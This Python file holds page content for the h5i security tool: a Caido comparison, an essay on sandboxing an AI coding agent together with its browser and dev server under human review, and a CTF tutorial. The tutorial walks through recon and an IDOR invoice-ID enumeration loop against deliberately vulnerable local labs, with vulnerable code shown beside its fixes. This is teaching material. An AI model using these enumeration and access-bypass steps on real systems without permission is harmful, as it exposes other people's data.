    "social_image": "https://h5i.dev/_static/caido-vs-h5i.svg",
    "social_alt": "Caido provides a broad proxy workspace with HTTPQL, Replay, Automate, workflows, and skills, while h5i connects an agent's browser actions to captured traffic and replay",
    "time": "4 min", "tags": "Caido &middot; AI agents &middot; Pentesting",
    "title": "Caido vs h5i for AI agents",
    "h1": "Caido vs h5i for AI agents",
    "description": "Caido vs h5i for AI agents: compare proxy history, HTTPQL, Replay, Automate, and Skills with fully automated agent-driven browser and HTTP testing.",
    "meta": "Caido vs h5i for AI agents: compare proxy history, HTTPQL, Replay, Automate, and Skills with fully automated agent-driven browser and HTTP testing.",
    "deck": "Caido gives humans and agents a complete proxy workspace. h5i is designed for fully automated penetration tests driven end to end by an external AI agent through browser and HTTP operations.",
    "body": f"""
<div class="callout"><strong>The short answer.</strong> Choose Caido for proxy history, HTTPQL, Replay, Automate, workflows, and agent access to the whole Caido API. Choose h5i for a fully automated penetration test in which an external AI agent drives browser exploration and HTTP experiments from start to finish.</div>
<figure class="feature-figure"><img src="/_static/caido-vs-h5i.svg" alt="Caido offers a broad workspace with HTTPQL, Replay, Automate, workflows, proxy history, and agent skills, while h5i connects browser actions, captured traffic, and request replay"><figcaption>Caido provides the broader traffic workbench. h5i gives an external agent the browser-and-HTTP loop needed to drive an investigation end to end.</figcaption></figure>
<div class="tbl-wrap"><table class="data"><thead><tr><th>Decision</th><th>Caido</th><th>h5i</th></tr></thead><tbody>
<tr><td>Traffic model</td><td>Intercepting proxy with searchable history</td><td>Browser session with captured messages</td></tr>
<tr><td>Request testing</td><td>Replay, payload fuzzing with Automate, reusable workflows</td><td>Structured replay, diff, match, and sequences</td></tr>
<tr><td>AI interface</td><td>Official skills with complete Caido API coverage</td><td>CLI or JSON RPC called by an external agent</td></tr>
<tr><td>Analysis</td><td>HTTPQL over a large traffic corpus</td><td>Small endpoint ledger tied to request and response evidence</td></tr>
<tr><td>Additional safety</td><td>Caido access follows the connected instance and credentials</td><td>Origin policy and an optional sandbox for the agent process tree</td></tr>
</tbody></table></div>
<h2 id="caido">Caido already has strong agent support</h2>
<p>HTTPQL filters proxied requests and responses by fields such as host, path, headers, body, status, timing, and source. Replay edits and resends individual requests. Automate runs payload sets, and workflows make processing reusable.</p>
<p>Official Caido Skills use the Client SDK and state that they cover the complete Caido API. An agent can search traffic, use Replay, fuzz with Automate, and operate the rest of the exposed workspace. Caido is therefore neither GUI-only nor merely “AI-assisted.” For an agent that needs a capable proxy workbench, Caido is usually the better fit.</p>
<h2 id="h5i">h5i starts from an autonomous testing loop</h2>
<p>h5i has much less testing machinery. Its browser is also the source of its HTTP record: the agent opens and operates a page, lists the resulting requests, then edits and replays a captured message by ID.</p>
{terminal('browser and HTTP traffic in one session', '$ h5i browser open https://target.example --capture --allow target.example\n$ h5i browser snapshot\n$ h5i browser click @e3\n$ h5i browser requests\n$ h5i websec replay req_42 --set query.id=456')}
<p>This direct browser-to-request path lets the external agent conduct the penetration test from exploration through HTTP experiments and follow-up decisions. Caido is better when the task starts from a large proxy history, needs expressive HTTPQL queries, or requires Automate and reusable workflows.</p>
<h2 id="sandbox">Sandboxing is optional</h2>
<p>For an autonomous red-team run, h5i can place the agent and browser in a box with restricted files, credentials, processes, and egress. This is an additional way to limit agent mistakes, not the main difference in traffic capture or request testing.</p>
<h2 id="decision">Choose by the testing interface</h2>
<ul><li><strong>Choose Caido</strong> for a rich proxy UI, large-scale traffic search, request replay, payload fuzzing, workflows, or agent access to those capabilities.</li><li><strong>Choose h5i</strong> for a fully automated penetration test driven end to end by an external AI agent.</li><li><strong>Consider h5i's sandbox</strong> separately when that agent's host and network access should be restricted.</li></ul>
<p>Neither product grants permission to test a target. Keep target ownership, rules of engagement, rate limits, and authorization outside the agent and visible to the reviewer.</p>
<h2 id="sources">Product references</h2>
<ul><li><a href="https://docs.caido.io/app/reference/httpql">Caido HTTPQL</a>, <a href="https://docs.caido.io/app/quickstart/replay">Replay</a>, and <a href="https://docs.caido.io/app/quickstart/automate">Automate</a></li><li><a href="https://docs.caido.io/app/concepts/workflows_intro">Caido workflows</a></li><li><a href="https://docs.caido.io/app/tutorials/skills">Caido Skills</a></li><li><a href="/manual/#h5i-browser">h5i browser</a></li><li><a href="/manual/#h5i-websec">h5i HTTP workbench</a></li></ul>""",
    "faq": [
        ("Is h5i an alternative to Caido?", "Only for smaller browser and HTTP tasks. Caido is much broader for proxy traffic analysis, payload automation, workflows, and web testing."),
        ("Can AI agents use Caido?", "Yes. Official Caido Skills use the Client SDK and cover the complete Caido API, including Replay, Automate, and traffic search."),
        ("What is the main architectural difference?", "Caido gives an agent a full proxy workspace. h5i gives an external agent a direct browser-and-HTTP loop for driving a penetration test end to end."),
    ],
    "next": ("/blog/burp-suite-vs-h5i-for-ai-agents/", "Compare the established suite", "Burp Suite vs h5i for AI agents", "Compare Burp's full testing platform with h5i's browser and HTTP command interface."),
    "cta": ("Choose by the traffic workflow", "Decide whether the agent needs a full proxy workspace or a direct browser-to-request loop.", "/guides/authorized-web-security-testing/", "Run an agent-led test"),
}


LOOP = {
    "section": "blog", "slug": "the-h5i-loop", "eyebrow": "Essay / Sandboxed workflow",
    "time": "10 min", "tags": "Browse &middot; Develop &middot; Review &middot; Apply",
    "title": "Sandbox the entire workflow: browse, develop, review, apply | h5i",
    "h1": "Sandbox the entire workflow: browse, develop, review, apply",
    "description": "Create one sandbox for an AI coding task, browse from inside it, develop and test there, then review the evidence before exporting or applying the patch.",
    "meta": "Keep browsing, code development, tests, and the dev server in one sandbox, then review its evidence before exporting or applying the patch.",
    "deck": "A browser and a coding sandbox are not two adjacent workflows. Put the browser, checkout, agent, tools, and dev server in one box; review what crossed that boundary before you apply the result.",
    "body": f"""
<p>A coding agent rarely stays in an editor. It reads documentation, installs dependencies, runs tests, starts a local application, opens that application in a browser, follows an error back into the code, and tries again. Sandboxing only the shell while the browser runs on the host splits one job across two security boundaries.</p>
<p>That split is easy to miss because browsing and code development have different interfaces. They are still one authority problem. The page can influence the agent. The browser can hold cookies and reach network destinations. The dev server can expose the code the agent just changed. If one of those pieces sits outside the box, the workflow is only partly contained.</p>
<div class="callout"><strong>The claim.</strong> Create the boundary before the work starts. Put the browser, checkout, agent, toolchain, tests, and dev server inside the same named box. Keep the evidence and the decision to export or apply outside it.</div>
<div class="tbl-wrap"><table class="data"><thead><tr><th>Phase</th><th>Inside the box</th><th>Outside the box</th></tr></thead><tbody>
<tr><td>Browse</td><td>Fresh browser profile, page state, cookies, network client</td><td>Policy, request observation where the tier supports it</td></tr>
<tr><td>Develop</td><td>Checkout, agent, package scripts, tests, dev server</td><td>Credential broker and resolved policy</td></tr>
<tr><td>Review</td><td>The proposed tree stays unchanged</td><td>Human reads diff, denials, commands, and browser evidence</td></tr>
<tr><td>Apply</td><td>No direct write path to the parent repository</td><td>Human exports or applies the accepted patch</td></tr>
</tbody></table></div>
<h2 id="box">1. Start with one boundary</h2>
<p>Create a named box from the repository before opening the browser or starting the agent. The <code>browser</code> profile supplies a fresh browser identity and the control path needed to operate it inside the box.</p>
{terminal('repository root', '$ h5i box --profile browser --engine h5i --isolation process --name fix-auth\n$ h5i box status fix-auth')}
<p>Creation freezes the base revision and resolves the policy before the workspace exists. <code>status</code> tells you which isolation tier the host actually provided, which paths are writable, how network access is scoped, and the digest that later receipts carry. If the requested policy cannot be enforced, creation fails instead of quietly substituting a weaker tier.</p>
<p>The source determines the output path. A box made from the current repository is a worktree on its own branch, so an accepted result can later be applied locally. A URL, pull request, or <code>--new</code> produces a detached box. Detached work can be exported as a patch, but <code>apply</code> and <code>rebase</code> refuse because that box has no authority over the parent repository.</p>
<div class="tbl-wrap">
<table class="data">
<thead><tr><th>Tier</th><th>What confines the code</th><th>Egress scoping</th></tr></thead>
<tbody>
<tr><td><code>workspace</code></td><td>A separate worktree, no confinement</td><td>none</td></tr>
<tr><td><code>process</code></td><td>Landlock, seccomp, namespaces; a supervisor and a private pid namespace</td><td>deny or host</td></tr>
<tr><td><code>supervised</code></td><td>The above plus a private netns and a seccomp-notify gate on <code>socket()</code></td><td>L3/L4</td></tr>
<tr><td><code>container</code></td><td>Rootless Podman on a portable image</td><td>L7 proxy</td></tr>
<tr><td><code>microvm</code></td><td>A guest with its own kernel, booted by microsandbox</td><td>L3/L4 in the guest</td></tr>
</tbody>
</table>
</div>
<p>The example names <code>process</code> because it can hold a resident browser without a heavyweight runtime. The tier changes what “inside” proves. A process-tier browser is confined for files and environment, but its request log remains the engine's own account. A tier with egress enforcement outside the browser can add host-observed network evidence. Resident browser sessions also need a tier that can keep the engine alive; on Linux today, a microVM is the tier that provides both residence and a network boundary. Read <code>status</code> rather than inferring guarantees from the word sandbox.</p>
<h2 id="browse">2. Put browsing inside the same box</h2>
<p>This flag connects the two workflows:</p>
{terminal('host', '$ h5i browser open https://docs.rs/ --allow docs.rs --in fix-auth\nok  browser session br_7k2xqa\n   placed   : box fix-auth\n\n$ h5i browser snapshot\n$ h5i browser click @e3\n$ h5i browser requests')}
<p><code>--in fix-auth</code> places the browser engine and its fresh profile in the named box. Later browser verbs address the same resident session, so the page state, cookies, downloads, and requests stay with the development environment instead of appearing in a host browser profile.</p>
<p>The distinction matters in both directions. External documentation can contain instructions that influence the agent, so it should not gain more filesystem or network authority than the coding task. Later, when the browser opens <code>http://localhost:3000</code>, loopback should mean the dev server inside the box—not some unrelated service on the developer's machine.</p>
<p>The browser still checks its origin policy before every request and records the decision before bytes move. Denied requests and refused redirects remain in the log. When the box tier enforces egress outside the engine, h5i can label that traffic <code>host-observed</code>. Without an outside network observer, it remains <code>engine-claimed</code>. Placement and evidence strength are related, but they are not the same claim.</p>
<h2 id="work">3. Develop and verify without crossing the boundary</h2>
<p>Enter the same named box for the coding session:</p>
{terminal('inside fix-auth', '$ h5i box shell fix-auth\nbox$ claude                          # or codex\nbox$ npm ci\nbox$ npm test\nbox$ npm run dev &')}
<p><code>shell</code> inherits stdio, and every descendant stays inside the resolved policy. The agent does not have to remember to wrap package-manager hooks, compiler workers, test processes, or the dev server separately. They are contained because they are children of the box session.</p>
<p>Now point the already-contained browser at the application. From a second host terminal:</p>
{terminal('browser in the same box', '$ h5i browser open http://localhost:3000 --in fix-auth --session app --new\n$ h5i browser snapshot --session app\n$ h5i browser requests --session app')}
<p>The browser and server meet on the box's loopback. The useful loop is now continuous: the agent edits, tests, starts the app, reads the page, inspects failed requests or console errors, fixes the code, and tests again. There is no host-browser detour in the middle.</p>
<p>If the agent invokes the browser from inside an existing <code>box shell</code>, it opens the session without <code>--in</code>; it is already in the box. The flag is for a host-side command that places a browser into a box the caller stands outside. h5i refuses <code>--in</code> from inside rather than pretending to add a second boundary.</p>
<p>Model API keys remain on the host. A reverse proxy injects the right key into outbound model requests and scopes it to the runtime, so a Claude box cannot obtain the OpenAI credential. The box gets a copy of the agent's HOME state with credential-shaped entries removed.</p>
<p>The human can observe the page without moving the browser back onto the host:</p>
{terminal('watch', "$ h5i box view fix-auth          # the box's page, on a loopback-only forward\n$ h5i box view fix-auth --term   # draw it in this terminal instead\n$ h5i ui                         # the whole fleet, read-only, every route a GET")}
<p>Frames cross outward through the viewer. The browser profile, page execution, and network identity do not. If a human takes control, the control transfer is recorded and stale page handles are invalidated before the agent resumes.</p>
<h2 id="review">4. Review the whole run, not only the diff</h2>
{terminal('export', '$ h5i box diff fix-auth                    # against the pinned base\n$ h5i box export fix-auth --out ./review\n  wrote ./review/patch.diff, ./review/report.md, ./review/receipt.json\n\n$ $EDITOR ./review/report.md              # read this first\n$ git apply --3way ./review/patch.diff')}
<p>The patch answers what changed. It does not answer which tests ran, what the browser reached, what the boundary refused, or whether a human changed page state during the run. <code>report.md</code> brings those records together without flattening their sources.</p>
<p>Start with denied egress and unavailable evidence. Then read commands with their lanes and exit codes, browser requests and errors, control handovers, and finally the agent's proposal. The proposal comes last because it is testimony from the subject of the review, not an outside observation.</p>
<p>Export is an output gate, not another agent command. The box cannot write <code>./review</code>; h5i writes the validated bundle from outside after the human asks. Reviewers can carry the patch elsewhere with <code>git apply --3way</code>, which is mandatory for detached boxes.</p>
<h2 id="apply">5. Apply only the result you accept</h2>
{terminal('local box only', '$ h5i box status fix-auth          # check base drift and evidence gaps\n$ h5i box apply fix-auth           # land the reviewed proposal')}
<p><code>apply</code> is available only when the box was created from the current repository. It is never an automatic final step. If the parent branch moved, status names the drift; you can rebase the box deliberately, export the patch, or decline the work.</p>
<p>This is where keeping the workflow in one boundary pays off. The reviewer is not reconciling an uncontained browser history with a sandboxed shell and an agent-authored summary. The code, browser behavior, request decisions, and executions belong to one named run, and the parent repository changes only after that run has been examined.</p>
<h2 id="lifecycle">Cleaning up</h2>
{terminal('lifecycle', "$ h5i box ls                  # every box on this clone\n$ h5i box status fix-auth     # policy enforced, evidence, base drift\n$ h5i box rebase fix-auth     # re-pin onto the parent's current tip\n$ h5i box abort fix-auth      # stop, preserving it for forensics\n$ h5i box rm fix-auth\n$ h5i box gc                  # reclaim finished workspaces")}
<p><code>abort</code> stops the box but keeps its evidence. <code>rm</code> deletes it. Keeping those actions separate matters most when a run has done something surprising.</p>
<h2 id="cost">Making it cheap enough to do constantly</h2>
<p>A sandbox saved for obviously dangerous jobs will miss ordinary dependency installs, where supply-chain surprises often arrive. The boundary needs to be cheap enough for routine work.</p>
<p>The lighter tiers start quickly. Dependency caches are shared carefully: each project and package ecosystem gets a cache keyed by its lockfile digest. Agent boxes mount it read-only. Only a box with no agent inside may update it, so two agents never meet through writable cache state.</p>
{terminal('cache', '$ h5i box cache refresh npm\n$ h5i box cache ls            # which are stale, and therefore unused')}
<h2 id="test">A test you can apply to any agent sandbox</h2>
<p>You can ask the same questions of any tool that claims to contain an agent:</p>
<ol>
<li>Where do package install scripts execute, and under which home directory?</li>
<li>Does the browser run inside the same boundary as the checkout and dev server?</li>
<li>When the browser opens localhost, whose loopback does it reach?</li>
<li>Who wrote the record of what ran: the thing being reviewed, or something outside it?</li>
<li>Is a refused action recorded, or does it simply not appear?</li>
<li>Can the agent write the accepted result directly, or does a person carry it across?</li>
</ol>
<p>If one of those answers points outside the boundary, part of the job is still running uncontained.</p>
<h2 id="limits">What this does not claim</h2>
<p>Containment can stop the agent from touching your host. It cannot stop private source from appearing in a model request that policy already allows. If the source must not leave, use a self-hosted model or disable model egress.</p>
<p>Every tier below <code>microvm</code> shares the host kernel. Those tiers are meant for runaway agents and careless dependency code, not a targeted kernel exploit. The microVM tier moves the boundary to a hypervisor.</p>
<p>A receipt is protected from the box, but the host owner can still alter it. It answers a narrow question: could the agent have written this record? It does not prove that the person presenting the receipt left it untouched.</p>
<h2 id="sources">Sources and further reading</h2>
<ul>
<li><a href="/blog/the-environment-is-the-sandbox/">Why sandbox the entire AI agent workload</a>, for the threat model behind the workflow.</li>
<li><a href="/blog/evidence-for-agent-work/">Review AI-generated code with execution evidence</a>, for what a diff, receipt, and agent summary can each establish.</li>
<li><a href="/guides/first-box/">The first-box guide</a>, for running this workflow once on a real repository.</li>
<li><a href="/guides/watch-the-browser/">Watch the browser</a>, for dev-server loopback and human control transfer.</li>
<li><a href="/manual/#the-loop">The manual</a>, for every flag named above.</li>
</ul>""",
    "faq": [
        ("Does --in create the box?", "No. Create the box first, then pass its name to h5i browser open --in. The browser session runs inside that existing box and uses its resolved policy."),
        ("Can an agent already inside the box use --in?", "No. It opens the browser without --in because it is already inside the boundary. The --in flag is for a host-side command placing a browser into a named box."),
        ("What is the difference between export and apply?", "export writes patch.diff, report.md and receipt.json to a directory and touches nothing else, so you decide what happens next. apply lands the work directly on the parent repository and is only available when the box came from that repository. On a detached box, created from a URL, a pull request or --new, apply refuses and points at export."),
    ],
    "next": ("/blog/the-environment-is-the-sandbox/", "Why sandbox it", "Why sandbox the entire AI agent workload", "See why dependencies, tools, tests, servers, and browsers need one boundary."),
    "cta": ("Start with one box", "Run h5i box probe, create a box, and inspect what the host actually enforced.", "/guides/first-box/", "Follow the first-box guide"),
}


# The five chapters of the h5i web security course, whose 42 runnable labs
# live in h5i-dev/h5i-tutorial. Numbered in the book ("1. The workbench",
# "## 1.4 Replay"); here they are pages rather than a numbered part of
# anything, so the numbers are off the titles and the headings.




# The h5i web security tutorial, ten articles that walk the labs in
# h5i-dev/h5i-tutorial. Published as a numbered series whose first part is on
# Medium; here they are pages in order, so the numbers are off the titles.


RECON = {
    "section": "guides", "slug": "recon-and-idor", "published": "2026-09-13",
    "eyebrow": "Tutorial 01 / Recon", "time": "10 min",
    "tags": "Recon &middot; IDOR &middot; Labs 5&ndash;7",
    "title": "Recon and IDOR | h5i web security tutorial",
    "h1": "Recon and IDOR",
    "description": "A beginner-friendly CTF tutorial: discover hidden endpoints, test object-level authorization, and learn why an unguessable URL is not an access control.",
    "meta": "Discover hidden endpoints in an application, then test object-level authorization and see why an unguessable URL is not an access control.",
    "deck": "A beginner-friendly CTF tutorial: discover hidden endpoints, test object-level authorization, and learn why an unguessable URL is not an access control.",
    "next": ("/guides/broken-access-control/", "Next in the series", "Broken Access Control", "Compare two logged-in users, test authorization directly with --as, and find the fields a user interface never sends."),
    "cta": ("Run the labs yourself", "42 deliberately vulnerable applications, one binary, no Docker and no accounts.", "https://github.com/h5i-dev/h5i-tutorial", "Open h5i-tutorial"),
    "body": r"""<p>In <a href="https://medium.com/@Koukyosyumei/web-security-tutorial-with-h5i-part-1-http-request-tampering-39c4a0857b85">Part 1 on Medium</a>, we changed URL parameters, form fields, cookies, and HTTP methods. In every case, the vulnerable request was already in front of us.</p>
<p>Real applications are less helpful. Before testing a request, we usually have to discover it. We then have to ask not only whether an endpoint requires a login, but whether the logged-in user is allowed to access the particular object they requested.</p>
<p>In this article, we will use <a href="https://github.com/h5i-dev/h5i">h5i</a> and Labs 5–7 of <a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec">h5i-tutorial</a> to learn two fundamental web-security skills:</p>
<ul>
<li><strong>Reconnaissance:</strong> mapping the application before attacking it.</li>
<li><strong>Object-level authorization testing:</strong> checking whether one user can access another user's data.</li>
</ul>
<p>All three targets are deliberately vulnerable applications that run only on <code>127.0.0.1</code>. Do not test these techniques against systems unless you own them or have explicit permission.</p>
<h2 id="before-we-begin">Before we begin</h2>
<p>This article continues from <a href="https://medium.com/@Koukyosyumei/web-security-tutorial-with-h5i-part-1-http-request-tampering-39c4a0857b85">Part 1 on Medium</a>. You need Python 3.11 or later, h5i, and its <code>websec</code> plugin. The complete setup instructions are in the <a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec#1-setup">tutorial repository</a>.</p>
<pre><code class="language-bash">$ git clone https://github.com/h5i-dev/h5i-tutorial.git
$ cd h5i-tutorial/websec
$ h5i websec --help
</code></pre>
<p>The workflow remains the same:</p>
<ol>
<li>Open a page with capture enabled.</li>
<li>Inspect the recorded requests and responses.</li>
<li>Replay a request with one deliberate change.</li>
<li>Compare the result.</li>
</ol>
<h2 id="what-is-reconnaissance">What is reconnaissance?</h2>
<p><strong>Reconnaissance</strong>, usually shortened to <strong>recon</strong>, means learning what an application exposes: pages, API endpoints, parameters, versions, roles, and other reachable services.</p>
<p>The visible navigation is only one source. Useful information also appears in HTML comments, JavaScript files, HTTP headers, error messages, API documentation, <code>robots.txt</code>, and old endpoints that were hidden but never removed.</p>
<p>Recon is not just preparation for the “real” work. An endpoint that the development team forgot may be the vulnerability itself.</p>
<h2 id="lab-5-follow-the-applications-trail">Lab 5: follow the application’s trail</h2>
<p>Start the intranet lab:</p>
<pre><code class="language-bash">$ ./run.sh 05
</code></pre>
<p>It prints <code>http://127.0.0.1:9050</code>. Open the homepage and record its traffic:</p>
<pre><code class="language-bash">$ h5i browser open 'http://127.0.0.1:9050/' \
  --session lab05 --new --capture
$ h5i browser markdown --session lab05
</code></pre>
<p>The rendered page contains links to <code>/docs</code> and <code>/api/v3/whoami</code>. The API answers with <code>401 Unauthorized</code> because we do not have a bearer token.</p>
<p>It would be easy to stop there. Instead, read both the rendered page and the original HTTP response:</p>
<pre><code class="language-bash">$ h5i websec show res_0 --session lab05 --raw
</code></pre>
<p>Near the end of the HTML is a comment that the browser does not display as page text:</p>
<pre><code class="language-html">&lt;!-- TODO(dana): kill the v0 API before the audit --&gt;
</code></pre>
<p>An HTML comment is not secret. Anyone who receives the page can read its source. This one tells us that an older API version may still exist.</p>
<h3 id="check-robotstxt">Check <code>robots.txt</code></h3>
<p><code>robots.txt</code> tells search-engine crawlers which paths they should avoid. It is public and does not prevent a person from requesting those paths.</p>
<p>Replay the captured homepage request, changing only its path:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab05 --set path=/robots.txt
$ h5i websec show res_1 --session lab05 --raw
</code></pre>
<p>The response contains:</p>
<pre><code class="language-text">User-agent: *
Disallow: /internal/
Disallow: /api/v0/
</code></pre>
<p><code>Disallow</code> means “please do not index this path,” not “deny access to this path.” In practice, <code>robots.txt</code> can become a public list of interesting locations.</p>
<p>The <code>/docs</code> page also points to <code>/internal/notes.md</code>. Request it by replaying the same captured request:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab05 --set path=/internal/notes.md
$ h5i websec show res_2 --session lab05 --raw
</code></pre>
<p>The notes explain that version 3 requires authentication, while version 0 predates it. They also identify employee <code>1</code> as the service account.</p>
<p>We can now test the old endpoint directly:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab05 \
  --set path=/api/v0/employee/1
$ h5i websec show res_3 --session lab05 --raw
</code></pre>
<p>The response contains the service account and:</p>
<pre><code class="language-text">FLAG{recon_trail}
</code></pre>
<p>The precise response number may differ if you sent additional requests. Use the <code>seq</code> value printed by <code>replay</code> to find the corresponding <code>res_N</code>.</p>
<h3 id="why-did-this-work">Why did this work?</h3>
<p>The application protects its current API:</p>
<pre><code class="language-python">@app.get(&quot;/api/v3/whoami&quot;)
def whoami(req):
    return js({&quot;error&quot;: &quot;missing bearer token&quot;}, 401)
</code></pre>
<p>But the deprecated API remains routable and contains no authorization check:</p>
<pre><code class="language-python">@app.get(&quot;/api/v0/employee/(\\d+)&quot;)
def employee_v0(req, emp_id):
    if emp_id == &quot;1&quot;:
        return js({&quot;id&quot;: 1, &quot;name&quot;: &quot;svc-deploy&quot;, &quot;notes&quot;: FLAG})
</code></pre>
<p>Calling an API “deprecated” does not disable it. The old route must be removed, or it must pass through the same centralized authentication and authorization controls as the new route.</p>
<h3 id="keep-the-map">Keep the map</h3>
<p>h5i can summarize everything reached during the session:</p>
<pre><code class="language-bash">$ h5i websec sitemap --session lab05 --human
$ h5i websec requests --session lab05 --human
</code></pre>
<p>The sitemap is useful because it turns recon into a reproducible artifact instead of a list you try to remember.</p>
<h2 id="authentication-is-not-authorization">Authentication is not authorization</h2>
<p>Before the next lab, we need to separate two related ideas.</p>
<p><strong>Authentication</strong> asks: <em>Who are you?</em></p>
<p><strong>Authorization</strong> asks: <em>Are you allowed to do this?</em></p>
<p>A website may correctly identify Alice and still accidentally let Alice read Bob’s invoice. That is an authorization failure.</p>
<p>When the object is selected using an identifier supplied by the client—such as <code>/invoice/1041</code>, <code>?document_id=7</code>, or a UUID—and the server does not verify ownership, the bug is commonly called an <strong>insecure direct object reference (IDOR)</strong>. It is also described more generally as <strong>broken object-level authorization (BOLA)</strong>.</p>
<h2 id="lab-6-enumerate-sequential-invoice-ids">Lab 6: enumerate sequential invoice IDs</h2>
<p>Start the invoice lab:</p>
<pre><code class="language-bash">$ ./run.sh 06
</code></pre>
<p>The homepage tells us that we are account <code>77</code> and that our latest invoice is <code>1041</code>. Open that invoice:</p>
<pre><code class="language-bash">$ h5i browser open \
  'http://127.0.0.1:9060/api/invoice?id=1041' \
  --session lab06 --new --capture
$ h5i websec show res_0 --session lab06 --raw
</code></pre>
<p>The response includes both the invoice ID and its account:</p>
<pre><code class="language-json">{
  &quot;viewer_account&quot;: 77,
  &quot;id&quot;: 1041,
  &quot;account&quot;: 77,
  &quot;total&quot;: 41
}
</code></pre>
<p>Now change the invoice ID while keeping our identity unchanged:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab06 --set query.id=1040
</code></pre>
<p>One changed value is enough to form the important question: <em>Does the server verify that account 77 owns the requested invoice?</em></p>
<p>Because the IDs are sequential, we can inspect nearby values. The replay command returns JSON containing the response status and size, so we do not need to print every body:</p>
<pre><code class="language-bash">$ for id in $(seq 1000 1050); do
    printf '%s ' &quot;$id&quot;
    h5i websec replay req_0 --session lab06 \
      --reset-budget --set &quot;query.id=$id&quot; |
      python3 -c 'import json,sys; r=json.load(sys.stdin)[&quot;response&quot;]; print(r[&quot;status&quot;], r[&quot;bytes&quot;])'
  done
</code></pre>
<p>Most responses form similar clusters. Invoice <code>1004</code> is larger because it has an additional memo. Replay that ID and read the new response:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab06 --reset-budget \
  --set query.id=1004
</code></pre>
<p>Note the printed <code>seq</code>, then replace <code>N</code> below with that number:</p>
<pre><code class="language-bash">$ h5i websec show res_N --session lab06 --raw
</code></pre>
<p>The body shows an invoice belonging to account <code>1</code>, even though <code>viewer_account</code> is still <code>77</code>. Its memo contains:</p>
<pre><code class="language-text">FLAG{idor_sequential}
</code></pre>
<h3 id="what-does-reset-budget-do">What does <code>--reset-budget</code> do?</h3>
<p>h5i limits the network allowance of a browser session so that untrusted page code cannot make requests forever. A deliberate security-testing loop may need more requests than a normal page.</p>
<p><code>--reset-budget</code> renews that allowance for the replay. Use it for sweeps with more than a handful of requests. Otherwise, a stopped sweep can look like evidence that no endpoint exists.</p>
<h3 id="why-did-this-work_1">Why did this work?</h3>
<p>The vulnerable handler reads the current account and the requested invoice:</p>
<pre><code class="language-python">who = req.cookies.get(&quot;account&quot;, &quot;77&quot;)
row = INVOICES.get(wanted)
return js({&quot;viewer_account&quot;: int(who), **row})
</code></pre>
<p>The application knows who is viewing the invoice. It also knows which account owns the invoice. It never compares them.</p>
<p>That missing comparison is the vulnerability.</p>
<p>A safer version checks ownership before returning the record:</p>
<pre><code class="language-python">row = INVOICES.get(wanted)
if not row or row[&quot;account&quot;] != session.account:
    return js({&quot;error&quot;: &quot;no such invoice&quot;}, 404)
</code></pre>
<p>Returning the same <code>404 Not Found</code> for both nonexistent and unauthorized objects also avoids confirming that another customer’s invoice exists.</p>
<h2 id="lab-7-why-uuids-do-not-solve-idor">Lab 7: why UUIDs do not solve IDOR</h2>
<p>Sequential IDs are easy to enumerate, so a developer might replace them with random-looking identifiers such as UUIDs.</p>
<p>This is useful defense in depth, but it is not authorization. If an identifier leaks through another endpoint, anyone who obtains it can still request the object.</p>
<p>Start the document lab:</p>
<pre><code class="language-bash">$ ./run.sh 07
</code></pre>
<p>We belong to the <code>acme</code> tenant. Open the search endpoint:</p>
<pre><code class="language-bash">$ h5i browser open \
  'http://127.0.0.1:9070/api/search?q=report' \
  --session lab07 --new --capture
$ h5i websec show res_0 --session lab07 --raw
</code></pre>
<p>The response contains a result from a different tenant:</p>
<pre><code class="language-json">{
  &quot;q&quot;: &quot;report&quot;,
  &quot;hits&quot;: [
    {
      &quot;id&quot;: &quot;0d6d25cc-816e-a822-33f4-43e61907948c&quot;,
      &quot;title&quot;: &quot;TPS Report&quot;,
      &quot;tenant&quot;: &quot;initech&quot;
    }
  ]
}
</code></pre>
<p>The UUID would be impractical to guess. We did not guess it—the search endpoint gave it to us.</p>
<p>The lab asks us to find Initech’s break-glass document. Search for the title:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab07 --set query.q=glass
$ h5i websec show res_1 --session lab07 --raw
</code></pre>
<p>The result reveals another Initech document ID. Copy that ID into the document path:</p>
<pre><code class="language-bash">$ h5i websec replay req_0 --session lab07 \
  --set path=/api/document/94e1d935-a208-f5e8-e5b9-b8e47e375110
$ h5i websec show res_2 --session lab07 --raw
</code></pre>
<p>The server returns the cross-tenant document and:</p>
<pre><code class="language-text">FLAG{idor_uuid}
</code></pre>
<h3 id="two-authorization-failures">Two authorization failures</h3>
<p>The lab contains two separate mistakes.</p>
<p>First, search is global rather than tenant-scoped:</p>
<pre><code class="language-python">hits = [
    {&quot;id&quot;: k, &quot;title&quot;: v[&quot;title&quot;], &quot;tenant&quot;: v[&quot;tenant&quot;]}
    for k, v in DOCS.items()
    if q and q in v[&quot;title&quot;].lower()
]
</code></pre>
<p>Second, the read endpoint treats possession of the UUID as permission:</p>
<pre><code class="language-python">row = DOCS.get(doc_id)
return js({&quot;id&quot;: doc_id, **row})
</code></pre>
<p>Both queries need a tenant condition. Fixing only the search leak would leave the document endpoint vulnerable to identifiers exposed through logs, links, browser history, notifications, exports, or another future endpoint.</p>
<p>A secure object lookup includes the authorization boundary itself:</p>
<pre><code class="language-python">row = DOCS.get(doc_id)
if not row or row[&quot;tenant&quot;] != session.tenant:
    return js({&quot;error&quot;: &quot;not found&quot;}, 404)
</code></pre>
<p>The general rule is simple: <strong>possession of an object identifier is not permission to access the object.</strong></p>
<h2 id="a-reusable-testing-method">A reusable testing method</h2>
<p>The three labs suggest a workflow that applies to larger applications.</p>
<h3 id="1-map-before-probing">1. Map before probing</h3>
<p>Use the application normally with capture enabled. Then inspect:</p>
<ul>
<li>the rendered page and raw HTML;</li>
<li>recorded API requests;</li>
<li><code>robots.txt</code> and <code>sitemap.xml</code>;</li>
<li>documentation and API version prefixes;</li>
<li>error messages, redirects, headers, and JavaScript files.</li>
</ul>
<p>Keep the resulting endpoints in <code>h5i websec sitemap</code>.</p>
<h3 id="2-identify-actors-and-objects">2. Identify actors and objects</h3>
<p>Write down the application’s users and roles: anonymous visitor, customer, moderator, administrator, support agent, or another tenant.</p>
<p>Then identify its objects: invoices, documents, orders, tickets, files, or API keys.</p>
<h3 id="3-change-one-object-identifier">3. Change one object identifier</h3>
